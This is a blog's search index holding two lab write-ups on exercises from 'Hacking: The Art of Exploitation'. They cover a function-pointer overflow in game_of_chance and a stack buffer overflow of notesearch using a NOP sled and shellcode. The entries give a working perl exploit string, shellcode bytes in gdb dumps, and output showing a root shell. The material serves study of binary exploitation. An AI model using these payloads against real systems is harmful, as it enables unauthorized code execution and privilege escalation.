<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>Hacking: The Art of Exploitation Overflowing Function Pointers writeup</title>
      <link href="/2018/11/19/Hacking-The-Art-of-Exploitation-Overflowing-Function-Pointers-writeup/"/>
      <url>/2018/11/19/Hacking-The-Art-of-Exploitation-Overflowing-Function-Pointers-writeup/</url>
      
        <content type="html"><![CDATA[<p>The exploit buffer to overflow the function pointer is as follows,</p><p><code>perl -e &#39;print &quot;1\n5\nn\n5\n&quot; . &quot;A&quot;x100 . &quot;\x70\x8d\x04\x08\n&quot; . &quot;1\n&quot; . &quot;y\n&quot;x10 . &quot;n\n5\nJon Erickson\n7\n&quot;&#39; |./game_of_chance</code></p><p>The key for this exploit to work is to:</p><p><strong>play the same game after changing your user name.</strong></p><p>The exploitation is divided into two phases,</p><ol><li>The first phase is to select a game to play, and change your user name right after.</li></ol><p>The game can be either game 1 or 2 or 3. This sets the <code>last_game</code> which will be compared to the <code>chocie</code> in phase 2.</p><p>They need to be equal to allow the exploitation to work.</p><p>Changing the user name is to overwrite the function poitner <code>current_game</code> with the address of the <code>jackpot()</code> function.</p><ol start="2"><li>In the second phase, when the same game is played, the following code snippet will be skipped, because <code>choice</code> is intentionally made to equal to <code>last_game</code>.</li></ol><p>This makes the execution proceeds to <code>play_the_game</code>. And when <code>player.current_game()</code> is reached, the exeuction will jump to location <code>&quot;\x70\x8d\x04\x08\n&quot;</code>, which is where the <code>jackpot()</code> function is located.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(choice != last_game) &#123; <span class="comment">// If the function ptr isn't set</span></span><br><span class="line">               <span class="keyword">if</span>(choice == <span class="number">1</span>)        <span class="comment">// then point it at the selected game</span></span><br><span class="line">                  player.current_game = pick_a_number;</span><br><span class="line">               <span class="keyword">else</span> <span class="keyword">if</span>(choice == <span class="number">2</span>)</span><br><span class="line">                  player.current_game = dealer_no_match;</span><br><span class="line">               <span class="keyword">else</span></span><br><span class="line">                  player.current_game = find_the_ace;</span><br><span class="line">               last_game = choice;   <span class="comment">// and set last_game.</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> binary_exploitation </tag>
            
            <tag> hacking_the_art_of_exploitation </tag>
            
            <tag> c </tag>
            
            <tag> expoit </tag>
            
            <tag> buffer_overflow </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hacking: The Art of Exploitation - Exploit_notesearch.c writeup</title>
      <link href="/2018/11/06/Hacking-The-Art-of-Exploitation-Exploit-notesearch-c-writeup/"/>
      <url>/2018/11/06/Hacking-The-Art-of-Exploitation-Exploit-notesearch-c-writeup/</url>
      
        <content type="html"><![CDATA[<p>What the exploit_notesearch.c does, is to allocate an area of memory pointed to by buffer, to have the exploitable command stored there.</p><p>Note, it only constructs the exploit command, not use<br>The first question you might ask after going throught the source code is probably be,</p><blockquote><p>How is the offset 270 determined?</p></blockquote><p>This is based on the assumption that the stack of the <code>notesearch</code> program is right on top of the <code>exploit_notesearch</code> program who invokes it. This is why the varialbe <code>i</code> is used as a reference point to reach to the exploit code exists in the <code>notesearch</code> stack.</p><p>exploit_notesearch只是用来构建一个这样的命令.</p><p>为什么在system(command)执行完成后再来看ret addr处的数据就看不到NOP或者exploit code了呢？<br>有可能是因为在notesearch执行完返回system()之后stack上的数据已经被破坏了.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/16xw searchstring</span><br><span class="line">0xbffff720:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff730:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff740:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff750:     0x90909090      0x90909090      0x90909090      0xdb31c031</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Program exited normally.</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(gdb) run 180</span><br><span class="line">Starting program: /home/eason/exploit_notesearch/exploit_notesearch 180</span><br><span class="line">child running - sleep()</span><br><span class="line">child running - sleep() finished</span><br><span class="line">[DEBUG] found a 13 byte note for user id 1000</span><br><span class="line">-------[ end of note data ]-------</span><br><span class="line">sh-3.2# exit</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main (argc=2, argv=0xbffff884) at exploit_notesearch.c:32</span><br><span class="line">32         free(command);</span><br><span class="line">(gdb) x/16xw 0xbffff750</span><br><span class="line">0xbffff750:     0xb7fd6ff4      0xbffff9f1      0xb7ea2fe8      0xb7fe6858</span><br><span class="line">0xbffff760:     0x19999999      0x07b0aabd      0xb8000ff4      0xb80016e0</span><br><span class="line">0xbffff770:     0x080481b4      0xbffff7b0      0xb7ff3e52      0xb8001898</span><br><span class="line">0xbffff780:     0xb7fe6b38      0x00000001      0x00000001      0x00000000</span><br></pre></td></tr></table></figure><p>The space for <code>char searchstring[100]</code> is allocated on stack.</p><p>The return address in my lab is 0xbffff750. If we examine the data stored in <code>searchstring</code>,<br>we will spot the following. So returning to 0xbffff750 will slip into the NOP sled, and evetually<br>the shellcode will be executed.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/16xw searchstring</span><br><span class="line">0xbffff720:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff730:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff740:     0x90909090      0x90909090      0x90909090      0x90909090</span><br><span class="line">0xbffff750:     0x90909090      0x90909090      0x90909090      0xdb31c031</span><br><span class="line">0xbffff760:     0xb099c931      0x6a80cda4      0x6851580b      0x68732f2f</span><br><span class="line">0xbffff770:     0x69622f68      0x51e3896e      0x8953e289      0xbf80cde1</span><br><span class="line">0xbffff780:     0xbffff750      0xbffff750      0xbffff750      0xbffff750</span><br><span class="line">0xbffff790:     0xbffff750      0xbffff750      0xbffff750      0xbffff750</span><br></pre></td></tr></table></figure><p>The NOP sled and shellcode constructed in exploit_notesearch program is stored at 0x804a016.</p><p>So when notesearch is called, the data stored in buffer in exploit_notesearch is copied over to the searchstring stored<br>on the stack of notesearch. We can see that stack of notesearch is big enough to accommodate the whole data,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) i r $ebp $esp</span><br><span class="line">ebp            0xbffff7a8       0xbffff7a8</span><br><span class="line">esp            0xbffff710       0xbffff710</span><br></pre></td></tr></table></figure><p>and the return address is set to be in the mid of the NOP sled on the stack.</p><h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info frame</span><br><span class="line">Stack level 0, frame at 0xbffff7b0:</span><br><span class="line"> eip = 0x804884e in main (notesearch.c:26); saved eip 0xb7eafebc</span><br><span class="line"> source language c.</span><br><span class="line"> Arglist at 0xbffff7a8, args: argc=2, argv=0xbffff834</span><br><span class="line"> Locals at 0xbffff7a8, Previous frame&apos;s sp is 0xbffff7b0</span><br><span class="line"> Saved registers:</span><br><span class="line">  ebp at 0xbffff7a8, eip at 0xbffff7ac</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> cyber_security </category>
          
          <category> binary_exploitation </category>
          
          <category> stack_overflow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary_exploitation </tag>
            
            <tag> hacking_the_art_of_exploitation </tag>
            
            <tag> c </tag>
            
            <tag> expoit </tag>
            
            <tag> buffer_overflow </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
